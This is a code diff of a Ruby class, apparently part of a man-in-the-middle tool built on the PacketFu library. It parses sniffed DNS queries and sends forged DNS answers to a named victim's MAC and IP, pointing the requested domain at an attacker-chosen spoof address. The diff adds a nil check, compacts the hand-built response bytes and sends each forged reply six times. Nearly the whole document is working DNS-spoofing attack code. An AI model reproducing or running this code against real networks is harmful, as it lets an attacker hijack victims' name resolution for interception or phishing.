@@ -74,9 +74,9 @@ class DNS
                            packet.payload[3].unpack('h*')[0].chr
 
 					if dns_type == '10' #not really ten, rather 1-0 (binnary) flag
-						puts "DNS Packet"
+
 						domain_name = extract_domain_name(packet.payload[12..-1])	
-            
+
 					     # Check if domain name field is empty
                         if domain_name.nil? then
                             puts "Empty domain name field"
@@ -96,21 +96,24 @@ class DNS
 	#
 	# ============================================================================================	
 	def extract_domain_name(payload)
-		domain_name = ""
-
-        while(true)
-        	
-        	 len = payload[0].unpack('H*')[0].to_i
-        	 # to understand below you might need to read up on dns packets. they take the form of [length][string][length][string][...]0
-        	 if len > 0 then #length of the first segment of the dns name
-                domain_name += payload[1, len] + "." #grab the first chunk from the begining, until the length specified by the packet
-                payload = payload[len + 1..-1]
-            else
-                domain_name = domain_name[0, domain_name.length - 1] # -1 to truncate the 0 at the end of the payload
-            	puts domain_name #testing
-                return domain_name
-         	
-            end # if len != 0 then
+		if(payload) then
+		    domain_name = ""
+            while(true)
+            	
+            	 len = payload[0].unpack('H*')[0].to_i
+            	 # to understand below you might need to read up on dns packets. they take the form of [length][string][length][string][...]0
+            	 if len != 0 then 
+            
+                    domain_name += payload[1, len] + "." #grab the first chunk from the begining, until the length specified by the packet
+                    payload = payload[len + 1..-1]
+                else
+                    domain_name = domain_name[0, domain_name.length - 1] # -1 to truncate the 0 at the end of the payload
+                	
+       
+                    return domain_name
+             	
+                end # if len != 0 then
+            end
         end
 	end
 	# ============================================================================================	
@@ -121,41 +124,47 @@ class DNS
 	# ============================================================================================	
 	def send_response(packet, domain_name)
 
- 		dns_packet = PacketFu::UDPPacket.new(:config => @cfg)
-        
+
+ 		dns_packet = PacketFu::UDPPacket.new(:config => @ifconfig) #pass our settings
+
         dns_packet.udp_src   = packet.udp_dst
         dns_packet.udp_dst   = packet.udp_src
         dns_packet.eth_daddr = @victim_mac
         dns_packet.ip_daddr  = @victim_ip
         dns_packet.ip_saddr  = packet.ip_daddr
-        dns_packet.payload   = packet.payload[0, 2] #identification from the packet that came in (these have to match)
-		# Set the fields for the DNS protocol
-      	dns_packet.payload += "\x81\x80"  #QR
-      	dns_packet.payload += "\x00\x01"  # OPCode
-      	dns_packet.payload +=  "\x00\x01" #Flags
-        dns_packet.payload += "\x00\x00" #Z
-        dns_packet.payload += "\x00\x00" #RCode
-
        
+        dns_packet.payload   = packet.payload[0, 2]
+        
+		# Set the fields for the DNS protocol
+        
+        dns_packet.payload += "\x81\x80" + "\x00\x01" + "\x00\x01"
+        dns_packet.payload += "\x00\x00" + "\x00\x00"
+            
         #iterate through each domain name part and put the length and the data into the packet
         domain_name.split('.').each do |part|
             dns_packet.payload += part.length.chr
             dns_packet.payload += part
         end # @domain_name.split('.').each do |part|
-        dns_packet.payload += "\x00\x00\x01\x00" 
-        dns_packet.payload += "\x01\xc0\x0c\x00"
-        dns_packet.payload += "\x01\x00\x01\x00" 
-        dns_packet.payload += "\x00\x1b\xf9\x00" 
-        dns_packet.payload +=  "\x04"	
+
+        dns_packet.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
+        dns_packet.payload += "\x01\x00\x01\x00" + "\x00\x1b\xf9\x00" + "\x04"
         # Now send back the fake address
-        
+
         spoof_ip = @spoof_ip.split('.')
         dns_packet.payload += [spoof_ip[0].to_i, spoof_ip[1].to_i, spoof_ip[2].to_i, spoof_ip[3].to_i].pack('c*')        
         
         #recalculate the checksum and send back the packet to the sender
         dns_packet.recalc()
-        dns_packet.to_w(@ifname)
-        puts dns_packet.payload
+        
+
+        (0..5).each do |i|
+            dns_packet.to_w(@iface)
+        end
+        puts "Spoofing " + domain_name
+
+
+        
+
 	end
 end
 
